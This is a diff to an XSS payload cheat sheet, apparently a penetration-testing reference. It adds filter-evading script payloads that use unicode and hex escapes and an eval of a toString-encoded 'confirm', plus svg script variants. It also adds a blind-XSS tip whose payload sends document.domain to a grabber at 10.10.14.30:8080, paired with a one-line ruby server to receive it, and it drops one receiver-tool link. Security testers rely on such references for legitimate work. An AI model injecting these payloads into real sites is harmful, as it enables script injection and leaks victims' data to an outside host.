@@ -158,6 +158,9 @@ Most tools are also suitable for blind XSS attacks:
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
 
 // Img payload
 <img src=x onerror=alert('XSS');>
@@ -177,6 +180,8 @@ Most tools are also suitable for blind XSS attacks:
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
 <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>alert('33')
+<svg><script>alert&lpar;'33'&rpar;
 
 // Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
@@ -437,7 +442,6 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 
 - [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
 - [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
-- [BlueLotus_XSSReceiver - FiresunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
 - [ezXSS - ssl](https://github.com/ssl/ezXSS)
 
 ### Blind XSS endpoint
@@ -452,6 +456,22 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
   - Administrative Panel logs
 - Comment Box
   - Administrative Panel
+
+### Tips
+
+You can use a [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
+
+Eg. payload
+
+```html
+<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
+```
+
+Eg. one-line HTTP server:
+
+```
+$ ruby -run -ehttpd . -p8080
+```
 
 ## Mutated XSS
 
